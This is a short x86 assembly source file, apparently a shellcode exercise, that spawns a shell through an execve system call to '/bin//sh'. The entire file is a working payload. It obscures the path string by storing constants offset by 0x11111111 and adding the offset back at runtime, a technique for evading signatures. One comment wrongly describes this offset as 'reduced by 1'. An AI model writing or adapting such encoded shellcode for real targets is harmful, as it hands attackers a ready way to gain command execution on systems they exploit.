global _start

section .text
_start:
    ; edx - envp
    xor edx, edx
    push edx
    mov edx, esp

    ; Prepare ecx (argv) for later
    xor ecx, ecx
    push ecx
    mov ecx, esp

    ; Prepare ebx - (pathname)
    xor ebx, ebx
    push ebx

    ; push the string into the stack
    ; "/bin//sh" - Extra slash to make it align
    ; with boundary of 4.

		; Hex values reduced by 1
		mov esi, 0x57621e1e
		add esi, 0x11111111
		mov DWORD [esp-4], esi

		mov esi, 0x5d58511e
		add esi, 0x11111111
		mov DWORD [esp-8], esi
		
		; Subtract esp manually
		sub esp, 0x08

    mov ebx, esp


    ; Finalize ecx
    mov DWORD [ecx], ebx

    ; Prepare eax - 11 (execve)
    xor eax, eax
    mov al, 0xB

    ; System Call
    int 0x80
